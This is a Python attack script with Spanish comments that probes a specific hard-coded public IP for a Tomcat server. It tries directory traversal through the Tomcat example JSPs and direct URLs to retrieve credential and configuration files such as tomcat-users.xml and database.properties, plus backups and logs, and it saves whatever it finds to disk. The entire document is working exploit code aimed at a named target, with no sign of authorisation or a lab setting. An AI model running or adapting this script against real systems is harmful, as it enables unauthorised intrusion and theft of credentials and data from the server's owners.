#!/usr/bin/env python3
# Búsqueda agresiva de archivos de configuración

import requests
import os

def find_config_files():
    target = "189.254.143.102"
    session = requests.Session()
    
    # Archivos de configuración comunes en Tomcat
    config_files = [
        # Tomcat
        "/conf/tomcat-users.xml",
        "/conf/server.xml", 
        "/conf/web.xml",
        "/conf/context.xml",
        
        # Aplicación SITO
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/database.properties",
        "/WEB-INF/classes/config.properties",
        "/META-INF/context.xml",
        
        # Archivos de backup
        "/conf/tomcat-users.xml.bak",
        "/conf/tomcat-users.xml.old",
        "/conf/tomcat-users.xml.backup",
        "/WEB-INF/web.xml.bak",
        
        # Logs y datos
        "/logs/catalina.out",
        "/data/",
        "/database/",
    ]
    
    print("[+] Buscando archivos de configuración...")
    
    for config_file in config_files:
        # Probar diferentes métodos de acceso
        methods = [
            f"http://{target}/examples/jsp/include/include.jsp?page=../../..{config_file}",
            f"http://{target}/examples/jsp/cal/cal2.jsp?time=....//..{config_file}",
            f"http://{target}{config_file}",  # Acceso directo
        ]
        
        for url in methods:
            try:
                r = session.get(url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    print(f"✅ POSIBLE ARCHIVO ENCONTRADO: {config_file}")
                    print(f"   URL: {url}")
                    print(f"   Tamaño: {len(r.content)} bytes")
                    
                    # Guardar contenido
                    filename = f"found_{config_file.replace('/','_')}"
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    print(f"   Guardado como: {filename}")
                    break
                    
            except:
                continue

if __name__ == "__main__":
    find_config_files()